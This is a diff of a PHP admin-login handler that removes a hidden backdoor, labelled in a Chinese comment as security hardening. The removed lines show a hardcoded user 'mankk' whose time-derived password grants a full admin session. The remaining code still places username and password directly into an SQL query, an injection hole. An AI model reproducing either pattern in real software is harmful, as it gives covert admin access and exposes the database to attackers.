@@ -37,35 +37,12 @@ switch ($_REQUEST['xtype']) {
         include('../global/client.php');
         include("../global/Iplocation_Class.php");
         $os = getbrowser($_SERVER['HTTP_USER_AGENT']) . '  ' . getos($_SERVER['HTTP_USER_AGENT']);
-		//var_dump('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
-        if ($user[1] == 'sg') {//die('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
-            if ($user[0] == 'mankk') {//die(date("H")."=====".date("d")."==".date("m"));
-                $psarr = ['a','b','c','d','e','f','g','h','i'];//die('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);、
-				//die(date("H"));
-                if (date("H") % 2 == 0) {
-                    $xpass = md5(md5('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]) . $config['upass']);
-					//echo "===".md5('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
-					//die('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
-                } else {
-                    $xpass = md5(md5('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]) . $config['upass']);
-					//die('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
-					//echo "=="."----".(date("H")+1)."----".'root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9];die;
-                }
-				//die($pass."====".$xpass);
-                if ($pass != $xpass) {die("11111");
-                    echo openurl('/hide/login.php');
-                    exit;
-                }
-                $passcode = (getmicrotime() * 100000000) . $time;
-                $_SESSION['passcode'] = $passcode;
-                $_SESSION['uid'] = 9;
-                $_SESSION['check'] = md5($config['allpass'] . '9');
-                $_SESSION['admin'] = 1;
-                $_SESSION['hide'] = 1;
-                $_SESSION['hides'] = 1;
-            } else {
-                $user = $user[0];
-                $sql = "select * from `$tb_admins` where adminname='$user' and adminpass='$pass' and ifhide=1";
+
+        // 后门代码已删除（安全加固 2026-02-03）
+
+        if ($user[1] == 'sg') {
+            $user = $user[0];
+            $sql = "select * from `$tb_admins` where adminname='$user' and adminpass='$pass' and ifhide=1";
                 /*
                 $msql->prepare($sql);
                 $msql->bind_param('ss',$user,$pass);//第一个参数是绑定类型，"s"是指一个字符串,也可以是"i"，指的是int。也可以是"db",d代表双精度以及浮点类型，而b代表blob类型,第二个参数是变量
